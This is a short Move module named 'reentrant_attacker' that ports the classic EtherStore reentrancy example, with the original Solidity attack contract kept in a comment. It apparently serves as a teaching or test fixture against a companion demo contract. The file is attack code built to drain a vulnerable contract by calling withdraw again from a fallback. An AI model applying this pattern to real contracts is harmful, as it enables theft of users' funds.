module deploy_address::reentrant_attacker {

	/*
	contract Attack {
		EtherStore public etherStore;

		constructor(address _etherStoreAddress) {
			etherStore = EtherStore(_etherStoreAddress);
		}

		// Fallback is called when EtherStore sends Ether to this contract.
		fallback() external payable {
			if (address(etherStore).balance >= 1 ether) {
				etherStore.withdraw();
			}
		}

		function attack() external payable {
			require(msg.value >= 1 ether);
			etherStore.deposit{value: 1 ether}();
			etherStore.withdraw();
		}

		// Helper function to check the balance of this contract
		function getBalance() public view returns (uint) {
			return address(this).balance;
		}
	}*/

	use deploy_address::reentrant_etherstore;
	use std::signer;


	public fun fallback(addr: address) {
		reentrant_etherstore::withdraw(addr);
	}

	public fun attack(acc: &signer) {
		reentrant_etherstore::deposit(acc, 1);
		reentrant_etherstore::withdraw(signer::address_of(acc));
	}

}
